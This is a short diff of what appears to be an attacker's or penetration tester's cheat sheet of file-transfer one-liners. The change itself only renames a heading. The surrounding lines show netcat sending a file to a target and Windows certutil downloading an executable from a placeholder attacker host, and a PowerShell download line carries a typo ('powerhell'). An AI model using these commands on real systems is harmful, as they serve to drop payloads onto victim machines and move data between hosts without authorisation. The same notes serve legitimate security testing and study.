@@ -9,5 +9,5 @@ nc -w 3 <target-IP> 1234 < network.pkt
 DOWNLOAD FROM WINDOWS CMD
 certutil -urlcache -f http://<attacker-IP>:<atacker-Port>/file.exe file.exe
 
-DOWNLOAD FROM WINDOWS (from cmd)
+DOWNLOAD FROM WINDOWS POWERSHELL (from within cmd)
 powerhell Invoke-WebRequest -Uri http://www.contoso.com -OutFile file
